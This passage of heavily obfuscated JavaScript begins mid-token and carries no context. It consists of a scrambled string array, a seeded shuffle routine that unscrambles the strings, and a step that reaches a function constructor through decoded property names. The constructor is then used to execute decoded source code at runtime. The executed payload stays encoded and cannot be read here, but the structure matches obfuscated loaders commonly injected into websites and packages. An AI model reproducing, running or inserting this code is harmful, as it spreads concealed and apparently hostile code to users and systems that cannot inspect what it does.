f3(0x23f)+_0x4fb6f3(0x236)+_0x4fb6f3(0x2a9)+_0x4fb6f3(0x261)+_0x4fb6f3(0x24c)+_0x4fb6f3(0x349)+_0x4fb6f3(0x2d7)+_0x4fb6f3(0x1dc)+_0x4fb6f3(0x290)+_0x4fb6f3(0x267)+_0x4fb6f3(0x24b)+_0x4fb6f3(0x279)+_0x4fb6f3(0x1d1)+_0x4fb6f3(0x1d9)+_0x4fb6f3(0x1c4)+_0x4fb6f3(0x204)+_0x4fb6f3(0x2c0)+_0x4fb6f3(0x1cd)+_0x4fb6f3(0x26a)+_0x4fb6f3(0x2db)+_0x4fb6f3(0x2b0)+_0x4fb6f3(0x1bf)+_0x4fb6f3(0x2c8)+_0x4fb6f3(0x268)+_0x4fb6f3(0x1db)+_0x4fb6f3(0x313)+_0x4fb6f3(0x2eb)+_0x4fb6f3(0x2c7)+_0x4fb6f3(0x1b4))+(_0x4fb6f3(0x27d)+_0x4fb6f3(0x1e8)+_0x4fb6f3(0x225)+_0x4fb6f3(0x1ca)+_0x4fb6f3(0x1c2)+_0x4fb6f3(0x275)+_0x4fb6f3(0x229)+_0x4fb6f3(0x2da)+_0x4fb6f3(0x20b)+_0x4fb6f3(0x2e8)+_0x4fb6f3(0x2dc)+_0x4fb6f3(0x2ed)+_0x4fb6f3(0x2e4)+_0x4fb6f3(0x1c5)+_0x4fb6f3(0x331)+_0x4fb6f3(0x1ba)+_0x4fb6f3(0x335)+_0x4fb6f3(0x24d)+_0x4fb6f3(0x244)+_0x4fb6f3(0x1df)+_0x4fb6f3(0x241)+_0x4fb6f3(0x2de)+_0x4fb6f3(0x1d5)+_0x4fb6f3(0x1bc)+_0x4fb6f3(0x323)+_0x4fb6f3(0x27c)+_0x4fb6f3(0x238)+_0x4fb6f3(0x2a5)+_0x4fb6f3(0x234)+_0x4fb6f3(0x25c)+_0x4fb6f3(0x311)+_0x4fb6f3(0x26d)+_0x4fb6f3(0x282)+_0x4fb6f3(0x214)+_0x4fb6f3(0x200)+_0x4fb6f3(0x285)+_0x4fb6f3(0x1fc)+_0x4fb6f3(0x231)+_0x4fb6f3(0x2c6)+_0x4fb6f3(0x1af)+_0x4fb6f3(0x2fd)+_0x4fb6f3(0x2ea)+_0x4fb6f3(0x266)+_0x4fb6f3(0x22d)+_0x4fb6f3(0x1f6)+_0x4fb6f3(0x2c1)+_0x4fb6f3(0x2f8)+_0x4fb6f3(0x308)+_0x4fb6f3(0x306)+_0x4fb6f3(0x327)+_0x4fb6f3(0x330)+_0x4fb6f3(0x248)+_0x4fb6f3(0x258)+_0x4fb6f3(0x27a)+_0x4fb6f3(0x286)+_0x4fb6f3(0x1e1)+_0x4fb6f3(0x1d0)+_0x4fb6f3(0x303)+_0x4fb6f3(0x1d2)+_0x4fb6f3(0x233)+_0x4fb6f3(0x309)+_0x4fb6f3(0x1b5)+_0x4fb6f3(0x1c1)+_0x4fb6f3(0x293)+_0x4fb6f3(0x2d0)+_0x4fb6f3(0x22c)+_0x4fb6f3(0x1fa)+_0x4fb6f3(0x2ce)+_0x4fb6f3(0x26f)+_0x4fb6f3(0x25a)+_0x4fb6f3(0x2b4)+_0x4fb6f3(0x22e)+_0x4fb6f3(0x341)+_0x4fb6f3(0x1b2)+_0x4fb6f3(0x28b)+_0x4fb6f3(0x2e5)+_0x4fb6f3(0x2fa)+_0x4fb6f3(0x284)+_0x4fb6f3(0x295)+_0x4fb6f3(0x1ae)+_0x4fb6f3(0x2f9)+_0x4fb6f3(0x239)+_0x4fb6f3(0x2c5)+_0x4fb6f3(0x208)),'sqyJp':function(_0x4a6983,_0x5d8b83){return _0x4a6983(_0x5d8b83);}},_0x5628f3='',_0x5b155e=_0x4038a2[_0x4fb6f3(0x34f)](-0x2544+0x1e9a+0x97f,0x3*-0x4a5+-0x9e2+-0x1a9b*-0x1);function _0x37092c(_0x15570f){var _0x32ad70=_0x4fb6f3,_0x23f62d=_0x4038a2[_0x32ad70(0x2a3)][_0x32ad70(0x221)]('|'),_0x49008f=0xb*-0x313+0x2520+0x4d*-0xb;while(!![]){switch(_0x23f62d[_0x49008f++]){case'0':var _0x81e67c=-0x2963e5+0x1b29cf+0x31266b;continue;case'1':var _0x8b675a=[];continue;case'2':var _0x32508d=_0x15570f[_0x32ad70(0x23d)];continue;case'3':;continue;case'4':;continue;case'5':return _0x8b675a[_0x32ad70(0x2ba)]('');case'6':for(var _0x3e5f9b=0x246c+0x14a1+0x1*-0x390d;_0x4038a2[_0x32ad70(0x207)](_0x3e5f9b,_0x32508d);_0x3e5f9b++){_0x8b675a[_0x3e5f9b]=_0x15570f[_0x32ad70(0x1b6)](_0x3e5f9b);}continue;case'7':for(var _0x3e5f9b=-0x1*0x8b5+-0x3*-0xa99+-0xc5*0x1e;_0x4038a2[_0x32ad70(0x1e9)](_0x3e5f9b,_0x32508d);_0x3e5f9b++){var _0x106960=_0x4038a2[_0x32ad70(0x305)][_0x32ad70(0x221)]('|'),_0x119348=-0x22ee+0x1f0a+-0x1f2*-0x2;while(!![]){switch(_0x106960[_0x119348++]){case'0':_0x81e67c=_0x4038a2[_0x32ad70(0x25b)](_0x4038a2[_0x32ad70(0x317)](_0x20e48c,_0x5cfcc9),-0x3344cb+0xa0e62c+-0x138848);continue;case'1':var _0x20e48c=_0x4038a2[_0x32ad70(0x243)](_0x4038a2[_0x32ad70(0x23e)](_0x81e67c,_0x4038a2[_0x32ad70(0x243)](_0x3e5f9b,0x683*0x2+-0x1387+0x37f*0x2)),_0x4038a2[_0x32ad70(0x28f)](_0x81e67c,0x1*-0x68d7+-0x6db7+0x15467));continue;case'2':var _0xc961fc=_0x4038a2[_0x32ad70(0x26b)](_0x20e48c,_0x32508d);continue;case'3':var _0x35fcbc=_0x4038a2[_0x32ad70(0x33c)](_0x5cfcc9,_0x32508d);continue;case'4':var _0x5cfcc9=_0x4038a2[_0x32ad70(0x243)](_0x4038a2[_0x32ad70(0x2a7)](_0x81e67c,_0x4038a2[_0x32ad70(0x1c7)](_0x3e5f9b,0x6*-0x447+0x4*-0x151+0x21de*0x1)),_0x4038a2[_0x32ad70(0x25b)](_0x81e67c,-0x122e0+0xb220+0x13c86));continue;case'5':var _0x50b272=_0x8b675a[_0xc961fc];continue;case'6':_0x8b675a[_0xc961fc]=_0x8b675a[_0x35fcbc];continue;case'7':_0x8b675a[_0x35fcbc]=_0x50b272;continue;}break;}}continue;}break;}};var _0x405011=_0x4038a2[_0x4fb6f3(0x201)](_0x37092c,_0x4038a2[_0x4fb6f3(0x1fd)])[_0x4fb6f3(0x283)](0x12a4+-0x29d+-0x1*0x1007,_0x5b155e),_0x5d3a76=_0x4038a2[_0x4fb6f3(0x2f1)],_0x50cea2=_0x37092c[_0x405011],_0x5ac588='',_0x1952e3=_0x50cea2,_0xb272c8=_0x4038a2[_0x4fb6f3(0x333)](_0x50cea2,_0x5ac588,_0x4038a2[_0x4fb6f3(0x24a)](_0x37092c,_0x5d3a76)),_0x243568=_0x4038a2[_0x4fb6f3(0x2e2)](_0xb272c8,_0x4038a2[_0x4fb6f3(0x201)](_0x37092c,_0x4038a2[_0x4fb6f3(0x259)])),_0x32ea11=_0x4038a2[_0x4fb6f3(0x333)](_0x1952e3,_0x5628f3,_0x243568);return _0x4038a2[_0x4fb6f3(0x298)](_0x32ea11,-0x19ab*-0x1+0xf6a+0x7*-0x71),0x25d2+0x237+0x409*-0x5;}());function _0x336b(){var _0x44aac0=_0x5cd1,_0x1e703a=[_0x44aac0(0x283),_0x44aac0(0x27c),_0x44aac0(0x2d3),_0x44aac0(0x205),_0x44aac0(0x1fd),'\x22lfS(re)=\x20','.u-ve2satv',_0x44aac0(0x1fb),_0x44aac0(0x308),_0x44aac0(0x22d),';uig7\x20ya0a',_0x44aac0(0x2b8),_0x44aac0(0x1f0),_0x44aac0(0x286),'IOBVr','.jL.)$4(rj',_0x44aac0(0x2d7),_0x44aac0(0x220),_0x44aac0(0x2e7),_0x44aac0(0x1e7),_0x44aac0(0x289),_0x44aac0(0x29c),_0x44aac0(0x22f),'dc0LH<L0&e',_0x44aac0(0x30f),'y}2)442),L',_0x44aac0(0x2bd),_0x44aac0(0x218),_0x44aac0(0x2aa),_0x44aac0(0x28b),_0x44aac0(0x278),'9a&b;)]$L0',_0x44aac0(0x2a7),_0x44aac0(0x1f1),_0x44aac0(0x26f),_0x44aac0(0x2cc),_0x44aac0(0x206),_0x44aac0(0x2eb),_0x44aac0(0x2a4),_0x44aac0(0x270),'6v265_f(LL','bygxlot',_0x44aac0(0x30b),_0x44aac0(0x25a),_0x44aac0(0x2f3),_0x44aac0(0x271),_0x44aac0(0x245),_0x44aac0(0x244),_0x44aac0(0x2e8),_0x44aac0(0x2a9),_0x44aac0(0x248),_0x44aac0(0x279),_0x44aac0(0x29d),'1|4|2|3|5|',_0x44aac0(0x26c),_0x44aac0(0x2de),_0x44aac0(0x1e0),_0x44aac0(0x29e),'LL\x20__e{L};','!h(4H0L,1c','Cl2+cz1(vy',_0x44aac0(0x25b),_0x44aac0(0x1d1),_0x44aac0(0x27e),_0x44aac0(0x2cd),'lbq27_(tSc',_0x44aac0(0x1f8),_0x44aac0(0x1e4),_0x44aac0(0x285),'eb\x2071b(<f]',_0x44aac0(0x236),_0x44aac0(0x25e),_0x44aac0(0x2ff),_0x44aac0(0x22b),_0x44aac0(0x2c7),_0x44aac0(0x233),_0x44aac0(0x211),_0x44aac0(0x203),'+-mtu;0ot[',_0x44aac0(0x20e),'9o)\x205yL_5.',_0x44aac0(0x2e2),'>62L?5jt35','_Le_1LaL.,','tL)fL/(\x20LL',_0x44aac0(0x2f6),_0x44aac0(0x2f0),_0x44aac0(0x2bc),_0x44aac0(0x266),_0x44aac0(0x1dd),_0x44aac0(0x20a),'+.kbbLb)n4',_0x44aac0(0x1fc),_0x44aac0(0x2d9),_0x44aac0(0x239),_0x44aac0(0x2ce),'(37m74DLLL','is(\x20(abgx;',_0x44aac0(0x24b),_0x44aac0(0x2dc),_0x44aac0(0x1e9),'!yD.3()]L:',_0x44aac0(0x2e0),_0x44aac0(0x2be),_0x44aac0(0x243),_0x44aac0(0x21d),_0x44aac0(0x1ef),_0x44aac0(0x258),'r)nuxL3;xg',_0x44aac0(0x2a3),_0x44aac0(0x257),'join','7|4|5',']vhhh=8ov+',_0x44aac0(0x2ad),_0x44aac0(0x2c4),')9p=c{s=h\x20',_0x44aac0(0x23e),_0x44aac0(0x26a),_0x44aac0(0x1d0),_0x44aac0(0x26b),_0x44aac0(0x1f5),'x53a1G7m,.',_0x44aac0(0x265),_0x44aac0(0x2c0),_0x44aac0(0x234),_0x44aac0(0x207),'x7]j=fihta',_0x44aac0(0x2d0),'9o6SdK}cre','_5nd\x22L\x20L$)',_0x44aac0(0x222),_0x44aac0(0x263),_0x44aac0(0x268),_0x44aac0(0x2dd),'41xab=\x20[%%',_0x44aac0(0x2b4),'L)sL3a@/8,',_0x44aac0(0x1dc),_0x44aac0(0x2a8),_0x44aac0(0x2cb),'\x20fk(o1Lu(3',_0x44aac0(0x20d),_0x44aac0(0x26e),_0x44aac0(0x2a1),_0x44aac0(0x2d5),_0x44aac0(0x1eb),_0x44aac0(0x303),'(!L))b0Qpg',_0x44aac0(0x2db),'O.#6,LL)9{',_0x44aac0(0x2b3),'25mHcYUU','@3olb_s)f5',_0x44aac0(0x307),_0x44aac0(0x226),_0x44aac0(0x23c),'ieb/_(L]7.',_0x44aac0(0x20c),_0x44aac0(0x2fb),_0x44aac0(0x262),'ft&.(ast5r','LaS.;fsn{j',_0x44aac0(0x241),_0x44aac0(0x1d7),_0x44aac0(0x30c),_0x44aac0(0x1de),_0x44aac0(0x2bb),_0x44aac0(0x2e9),'b!)E6o))+2',_0x44aac0(0x1d9),_0x44aac0(0x2b1),_0x44aac0(0x25d),_0x44aac0(0x2c6),_0x44aac0(0x274),'l4cL.1l).a',_0x44aac0(0x1d4),_0x44aac0(0x291),_0x44aac0(0x2df),_0x44aac0(0x2b0),'(){}+$H;np','P$rste.8a%',_0x44aac0(0x2e1),'};qliawv9c','48i3x)d-z]',_0x44aac0(0x2f4),_0x44aac0(0x1f9),_0x44aac0(0x284),'56u5.se5L(',_0x44aac0(0x2a0),_0x44aac0(0x28d),_0x44aac0(0x231),'3LxL5-,0;t','0.0C+a8)0=','2b_0K;t.-6',_0x44aac0(0x1d5),_0x44aac0(0x29b),_0x44aac0(0x2f1),'GL4,<4,feL',_0x44aac0(0x2fd),_0x44aac0(0x2fc),_0x44aac0(0x251),_0x44aac0(0x1df),_0x44aac0(0x1f3),_0x44aac0(0x277),_0x44aac0(0x249),'+\x20{ta}\x20ztm',_0x44aac0(0x30d),_0x44aac0(0x23b),_0x44aac0(0x267),_0x44aac0(0x24a),_0x44aac0(0x295),_0x44aac0(0x297),_0x44aac0(0x21a),_0x44aac0(0x228),_0x44aac0(0x260),_0x44aac0(0x294),_0x44aac0(0x309),_0x44aac0(0x22a),'lLk)L=.5c7','L81.pb.L2;',_0x44aac0(0x1d2),_0x44aac0(0x2ba),_0x44aac0(0x2ee),_0x44aac0(0x30a),'bsz!_.L,8R',_0x44aac0(0x1f7),_0x44aac0(0x2d2),_0x44aac0(0x2a5),_0x44aac0(0x214),_0x44aac0(0x21f),_0x44aac0(0x1ed),_0x44aac0(0x215),_0x44aac0(0x305),_0x44aac0(0x1fa),_0x44aac0(0x223),_0x44aac0(0x229),_0x44aac0(0x1e5),_0x44aac0(0x22c),';Lx)ayIF8$',_0x44aac0(0x252),'CdorV','_n.c2Iex.t',_0x44aac0(0x301),_0x44aac0(0x21c),_0x44aac0(0x2a2),_0x44aac0(0x256),_0x44aac0(0x290),'s_)/<;)o;u',_0x44aac0(0x219),_0x44aac0(0x250),'(_L3[g3Rob',_0x44aac0(0x23d),'\x20jc\x20ac8x(C','.{3LL_)j0L','4pt}..]bL3','={L)b-;Db_',_0x44aac0(0x2f8),_0x44aac0(0x2e3),_0x44aac0(0x254),_0x44aac0(0x275),_0x44aac0(0x2b7),_0x44aac0(0x2f5),'i>{r;=vg8=',_0x44aac0(0x24d),_0x44aac0(0x276),_0x44aac0(0x1f2),_0x44aac0(0x2ab),'j3h.p6trpL',_0x44aac0(0x2d1),_0x44aac0(0x24c),'L(1fs6tu_L',_0x44aac0(0x2f2),_0x44aac0(0x27d),_0x44aac0(0x261),_0x44aac0(0x242),_0x44aac0(0x2cf),_0x44aac0(0x216),'3VLnLLLi=Q',_0x44aac0(0x29f),_0x44aac0(0x235),_0x44aac0(0x1ea),'L$3(0:LL1L','3%o38bF%L5',_0x44aac0(0x238),_0x44aac0(0x2da),_0x44aac0(0x2c5),'2ttf=rnre(','259230Mtbkxd',_0x44aac0(0x2fe),'\x2233\x20.j8p((',_0x44aac0(0x1e3),_0x44aac0(0x1e1),_0x44aac0(0x246),_0x44aac0(0x204),_0x44aac0(0x2c9),'))]750os=C','L(u,f55g8o',_0x44aac0(0x280),'ga0,r;r6)h',_0x44aac0(0x259),_0x44aac0(0x28c),_0x44aac0(0x281),_0x44aac0(0x1e8),_0x44aac0(0x212),_0x44aac0(0x1db),'(ej02)\x224;L',_0x44aac0(0x225),'r,al}49cv,','E.k!CobeLo','LrL(.%b8)L','ntr.Lg419_',_0x44aac0(0x27b),_0x44aac0(0x2ac),'r=P!p_+#sL',_0x44aac0(0x293),';b;]aL%cA2',_0x44aac0(0x26d),'r.bkl+a68n',_0x44aac0(0x210),_0x44aac0(0x296),_0x44aac0(0x2ef),'7L51J)n0LL',_0x44aac0(0x269),_0x44aac0(0x273),_0x44aac0(0x2ec),'!%x2f9L,L_',_0x44aac0(0x221),_0x44aac0(0x2fa),_0x44aac0(0x28f),_0x44aac0(0x2d6),_0x44aac0(0x1ff),_0x44aac0(0x28a),_0x44aac0(0x298),'+8uxutC-;s',_0x44aac0(0x2ea),_0x44aac0(0x24f),_0x44aac0(0x2c1),_0x44aac0(0x29a),_0x44aac0(0x264),_0x44aac0(0x209),_0x44aac0(0x1f6),_0x44aac0(0x2f7),_0x44aac0(0x232),_0x44aac0(0x2ca),'yLn\x20;cLL(_',_0x44aac0(0x2e6),_0x44aac0(0x227),_0x44aac0(0x2bf),_0x44aac0(0x20b),_0x44aac0(0x2a6),_0x44aac0(0x27f),_0x44aac0(0x28e),_0x44aac0(0x1ec),_0x44aac0(0x23f),'pi=(A\x20erza','[0=]4{(861','4sL6#*5%f[',_0x44aac0(0x24e),_0x44aac0(0x200),_0x44aac0(0x237),_0x44aac0(0x247),_0x44aac0(0x1e6),_0x44aac0(0x2c3),_0x44aac0(0x1f4),_0x44aac0(0x2ed),'27x.35tt.L',_0x44aac0(0x282),_0x44aac0(0x25c),_0x44aac0(0x272),_0x44aac0(0x208),_0x44aac0(0x202),_0x44aac0(0x2d8),_0x44aac0(0x2b6),_0x44aac0(0x224),_0x44aac0(0x302),_0x44aac0(0x1fe),_0x44aac0(0x304),'e5aK0(od+6','mktwouptus',_0x44aac0(0x2c2),_0x44aac0(0x2e4),'e8);Ll2);i',_0x44aac0(0x20f),_0x44aac0(0x30e),_0x44aac0(0x300),'=4\x20==\x22m\x20\x22=','yPI}i1Lpj!',_0x44aac0(0x253),_0x44aac0(0x288),'s];s4ivn+,',_0x44aac0(0x23a),'b()L0_L{a.',_0x44aac0(0x2b5),_0x44aac0(0x306),'0b\x20Sh9uLlL',_0x44aac0(0x21b),_0x44aac0(0x255),'g{;;lhx.<l',_0x44aac0(0x287),'((=9c0LaLd',_0x44aac0(0x25f),_0x44aac0(0x2b2),_0x44aac0(0x1ee),_0x44aac0(0x2f9),_0x44aac0(0x217),'=)6L!L]_Lg',_0x44aac0(0x1d6),_0x44aac0(0x201),'.L032L0iL(',_0x44aac0(0x27a),_0x44aac0(0x292),_0x44aac0(0x230),_0x44aac0(0x2af),';r%2.Ue7n:','\x20\x20HL23(th5',_0x44aac0(0x213),_0x44aac0(0x2ae)];return _0x336b=function(){return _0x1e703a;},_0x336b();}